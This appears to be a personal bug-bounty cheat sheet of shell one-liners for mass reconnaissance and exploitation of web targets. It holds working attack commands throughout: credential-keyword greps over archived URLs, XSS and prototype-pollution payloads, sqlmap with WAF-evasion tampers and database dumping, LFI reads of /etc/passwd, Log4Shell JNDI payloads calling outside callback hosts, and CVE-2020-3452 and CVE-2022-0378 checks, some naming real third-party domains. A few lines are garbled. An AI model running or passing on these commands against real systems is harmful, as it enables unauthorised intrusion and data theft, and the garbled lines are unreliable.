	Technology Detect
	
cat domains.txt | xargs -I {} python techackz.py -u {}

cat domains.txt | xargs -I {} sh -c 'echo "Scanning: {}"; python techackz.py -u {}'

	
	
	subdomian enu
	
subfinder -d example.com -all -silent | httpx -silent -o live_subdomains.txt

cat domains.txt | xargs -n1 -I{} subfinder -d {} -silent | httpx -silent >> live_subdomains.txt

	
	404 wayback - confidential
	

curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.xero.com/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" -o xero.txt

cat domains.txt | xargs -I {} curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.{}/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" >> combined_results.txt

cat out.txt | uro | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.tar|\.deb|\.rpm|\.iso|\.img|\.apk|\.msi|\.dng|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc"

cat out.txt | grep -E "user|username|password|apikey|secret|token|accesskey|auth|credentials|keypair|config|login?|admin|root|db_|ssh|ftp|s3|cloud|private|public|sessionid|csrf|cookie|authorization|Bearer|jwt|private_key|public_key|api_key|client_id|client_secret|db_password|db_user|mysql|postgres|mongodb|redis|elastic|smtp|imap|sql"

waymore -i domains.txt -mode U -o urls_waymore.txt -t 10


   coffin method  / basic
   
katana -u live_bpost.txt -d 5 -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif -o urls.txt

katana -list domains.txt -silent -jc | tee js_files.txt  //mine

cat waybackurls.txt | grep -E "\.js$" > js_files.txt

cat js.txt | nuclei -t /home/kali/nuclei-templates/http/exposures/ -c 30

anew alive.txt && sed 's/$/\/?_proto_[testparam]=exploit\//' alive.txt | page-fetch -j 'window. testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"

cat subdomains.txt | httpx -silent | sed 's/$/\/?_proto_[testparam]=exploit\//' | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | grep "VULNERABLE"   // mine

subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

cat allurls.txt | gf lfi | nuclei -tags lfi

cat allurls.txt | gf redirect | uro | openredirex -p /home/kali/Desktop/openredirectPayloads.txt 	
	
	for automated xss 
	
cat domains.txt | xargs -I {} curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.{}/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" | grep -iE "(\?|&)(id|q|search|name|user|query|page|category|sort|searchTerm|lang|action|type|filter|token|ref|from|to)=.*(<script.*|alert.*|javascript:.*)" | gf xss | Gxss | kxss | uro -d

		
cat domains.txt | while read -r domain; do echo "$domain" | gau | gf xss | Gxss | kxss; done >> xss_output.txt
	
echo https://www.example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt

cat xss_output.txt | grep -oP 'URL: \K\S+' | sed 's/-,*/=/' | sort -u > final.txt


echo https://maservicesgroup.com.au/  | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"

	for content discovery 

feroxbuster -u exploit.linuxsec.org --filter-status 200,302,403

	to bypass 403 

./nomore403 -v -r -u  https://bugbounty.gamespress.com/Scripts/Admin/ 


	for js analysis
	
cat domains.txt | parallel -j4 'echo {} | waymore -mode U | gau | hakrawler -js -depth 2 | katana -d 3 -f js | subjs | uro | grep -E "\.js$" | sort -u | httpx -mc 200  >> final_js_files.txt'


echo "https://example.com" | waybackurls > waybackurls.txt

cat waybackurls.txt | grep -E "\.js$" > js_files.txt

cat js_files.txt | uro | httpx -mc 200 -o resumeValids.txt

alternative tools  {

cat domains.txt | gau --subs >> gau_output.txt
 
cat /home/kali/Documents/subdomains/deriv/live.txt | hakrawler -d 2 -u >> hakrawler_output.txt

cat /home/kali/Documents/subdomains/deriv/live.txt | katana -d 3 | grep -E "\.js$" >> katana_output.txt

cat domains.txt | subjs >> subjs_output.txt

}

cat /home/kali/Documents/waybackmachine/deriv/combined_results.txt | grep -E "\.js$" > js_files_from_all_tools.txt && cat gau_output.txt | grep -E "\.js$" >> js_files_from_all_tools.txt && cat katana_output.txt | grep -E "\.js$" >> js_files_from_all_tools.txt && cat hakrawler_output.txt | grep -E "\.js$" >> js_files_from_all_tools.txt && cat subjs_output.txt | grep -E "\.js$" >> js_files_from_all_tools.txt 

 cat js_files_from_all_tools.txt | uro  | httpx -mc 200 -o live_js_files.txt 


optional choices
(cat urls.txt | while read url; do curl -s -o /dev/null -w "%{http_code} $url\n" $url | grep -E "^(200|302)" >> valid_urls.txt; done

cat js_files.txt | httpx -content-type | grep '.js' > valid_js_files.txt

sed -i 's/\[^[\[35mapplication\/javascript^[\[0m\]//g' mintelValid.txt 

testing downloaded file:

nuclei -target filename -t js-analyse.yaml

nuclei -l valid_js_files.txt -t /home/kali/nuclei-templates/http/exposures/ -o nuclei_results.txt

nuclei -l file -t /home/kali/nuclei-templates/http/exposures/

	using waymore
	
waymore -i $domain -mode U -oU ./waymoreUrls.txt -url-filename -p 4

echo $domain | (gauplus || hakrawler) | grep -Ev "\.(jpeg|jpg|png|ico|woff|svg|css|ico|woff|ttf)$" > ./gaukrawler.txt

cat ./waymoreUrls.txt ./gaukrawler.txt | sort -u | uro | gf endpoints > allUrls.txt

(to bypass WAF ) sqlmap -u "https://target.com" --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump

using logger++ in burp 

Request.Query CONTAINS "=https"

        for openredirect 

cat subs.txt | (gau || hakrawler || waybackurls || katana) | grep "=" | dedupe | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'

cat urls.txt | grep -E "url=|redirect=|next=|to=" > filtered_urls.txt

sed -E 's/(url=|redirect=|next=|to=)[^&]*/\1/g' input.txt > output.txt

sed -E 's/(url=|redirect=|next=|to=)[^&]*/\1FUZZ/g' filtered_urls.txt > fuzzed_urls.txt

grep -E 'url=|return=|next=|redirect=|redir=|ret=|state=|dest=|callback=|open=|show=|view=|=http|%3dhttp|%3d%2f' input.txt > filtered_urls.txt

cat fuzzed_urls.txt | python3 openredirex.py -p payloads.txt -k FUZZ -c 100

cat urls.txt | qf or | sed 's/a,»/=/* | grep "?returnUrl' | uro › open.txt

cat allurls.txt | gf redirect | uro | openredirex -p /home/kali/Desktop/openredirectPayloads.txt 


	SSRF  / basic  
	
cat urls.txt | grep "=" | uro | qsreplace "burpcollaborator_link" >> tmp-ssrf.txt; httpx -silent -l tmp-ssrf.txt -fr  


	SQLI  /  basic useless
	
cat allurls.txt | grep "\-php" | sed 's/\.php.*/.php\//' | uro | sort -u | sed 's/$/%27%22%60/' | while read url; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mSQLI by Cybertix\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m"; done


cat urls.txt | grep "-php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mSQLI by Cybertix\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m"; done

cat subs.txt | (gau || hakrawler || katana || waybckurls) | grep "=" | dedupe | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs &&for i in $(cat tmp-sqli.txt); do ghauri -u "$i" --level 3 --dbs --current-db --batch --confirm; done  // not checked

cat subs.txt | (gau || hakrawler || katana || waybackurls) | grep "=" | dedupe | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs && for i in $(cat tmp-sqli.txt); do ghauri -u "$i" --level 3 --dbs --current-db --batch --confirm; done



	RCE  /  basic
	
cat targets.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent 

	CORS  /  basic
	
echo target.com | (gau || hakrawler || waybackurls || katana) | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing  on "$url"; fi; done   // not checked


cat urls.txt | uro | xargs -I {} sh -c 'curl -s -I -H "Origin: https://evil.com" -X GET "{}" | grep -q "https://evil.com" && echo "[Potential CORS Found] {}" || echo "Nothing on {}"'

echo "target.com" | gau | hakrawler | waybackurls | katana | while read url; do
    response=$(curl -s -I -H "Origin: https://evil.com" -X GET "$url")
    if echo "$response" | grep -q "https://evil.com"; then
        echo "[Potential CORS Found] $url"
    else
        echo "Nothing on $url"
    fi
done

	LFI  /  basic
	
cat targets.txt | (gau || hakrawler || waybackurls || katana) | grep "=" | dedupe | httpx-silent -paths lfi_wordlist.txt -threads 100 -random-agent -x GET, POST -status-code -follow-redirects -mc 200 -mr "root: [x*]: 0:0: "  //not tested

cat urls.txt | grep "=" | uro | sort -u | httpx -silent -path /home/kali/Desktop/lfi_wordlists.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root: [x*]: 0:0: "

subfinder -d mylocal.life | httpx -silent | gau | uro | gf lfi | while read url; do curl --silent "$(qsreplace '/etc/passwd' <<< "$url")" | grep -q "root:x:" && echo "$url is vulnerable"; done

cat subdomains.txt  | gau | uro | gf lfi | while read url; do curl --silent "$(qsreplace '/etc/passwd' <<< "$url")" | grep -q "root:x:" && echo "$url is vulnerable"; done




	DIR Listing   /  basic 
	
dirsearch -1 urls. txt -e conf, config, bak, backup, swp, old, db, sql, asp, aspx, aspx~, asp~, py, py~, rb, rb~, php, php~, bak, bkp, cache, cgi, conf, csv,html, inc, jar, js, json, jsp,jsp~, lock, log, rar, old, sql, sql. gz, sql.zip, sql.tar.gz, sql~, swp, swp~, tar,tar.bz2, tar gz, txt, wadl, zip, log, xml,js, json --deep-recursive --force-recursive --exclude-sizes=0B -- random-agent --full-url -o output.txt  //not tested

dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,asp~,py,py~,rb,rb~,php,php~,bkp,cache,cgi,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,xml \
--deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o lfi.txt

	LOG4SHELL  /  basic   // not implemented 
	
cat 1.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}";done   // not checked

cat 1.txt | while read host; do 
  curl -sk --insecure --path-as-is "$host/?test=\${jndi:ldap://L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}" \
       -H "X-Api-Version: \${jndi:ldap://log4j.requestcatcher.com/a}" \
       -H "User-Agent: \${jndi:ldap://L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}"; 
done

cat 1.txt | while read host; do curl -sk --insecure --path-as-is "$host/?test=\${jndi:ldap://L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}" -H "X-Api-Version: \${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: \${jndi:ldap://L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}"; done


	CVE-2020-3452
	
cat domains.txt | httpx -silent -ip | awk '{print $1}' > HOSTS.txt

while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt   // not checked

while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | grep -q "Cisco" && echo "[VULNERABLE] $LINE" || echo "[NOT VULNERABLE] $LINE"; done < HOSTS.txt

	CVE-2022-0378

cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done  //not checked

cat URLS.txt | uro | while read h; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x" | grep -qs "onmouse" && echo "$h: VULNERABLE"; done




